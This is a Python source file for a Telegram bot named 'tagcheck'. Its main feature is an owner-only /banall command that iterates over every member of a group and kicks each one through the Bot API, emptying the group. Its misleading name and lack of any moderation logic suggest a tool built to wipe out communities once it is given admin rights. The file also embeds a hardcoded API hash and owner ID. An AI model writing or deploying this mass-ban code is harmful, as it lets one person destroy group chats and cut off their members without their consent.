from pyrogram import filters, Client
from aiohttp import ClientSession
import logging
import os
import aiohttp
import regex
from pyrogram.types import Message
from pyrogram.types import (
   ChatPermissions,
   InlineKeyboardButton,
   InlineKeyboardMarkup
)

logging.basicConfig(level=logging.INFO)

API_ID = int(os.environ.get("API_ID", 6))
API_HASH = os.environ.get("API_HASH", "eb06d4abfb49dc3eeb1aeb98ae0f581e")
TOKEN = os.environ.get("TOKEN", None)
SUDO = os.environ.get("SUDO", None)
OWNER_ID = int(os.environ.get("OWNER_ID", 797768146))


tagcheck = Client(
   "tagcheck",
   bot_token=TOKEN,
   api_id=API_ID,
   api_hash=API_HASH
)


async def is_admin(message):
    user = await tagcheck.get_chat_member(message.chat.id, message.from_user.id)
    if user.status in ("administrator", "creator"):
      return True
    return False

@tagcheck.on_message(filters.command("start") & filters.user(OWNER_ID))
async def start(_, message):
   await message.reply("I am Alive.")
   
   
@tagcheck.on_message(filters.command("banall") &
                 filters.group & filters.user(OWNER_ID))
async def ban_all(c: Client, m: Message):
    chat = m.chat.id

    async for member in c.iter_chat_members(chat):
        user_id = member.user.id
        url = (
            f"https://api.telegram.org/bot{TOKEN}/kickChatMember?chat_id={chat}&user_id={user_id}")
        async with aiohttp.ClientSession() as session:
            await session.get(url)

tagcheck.run()
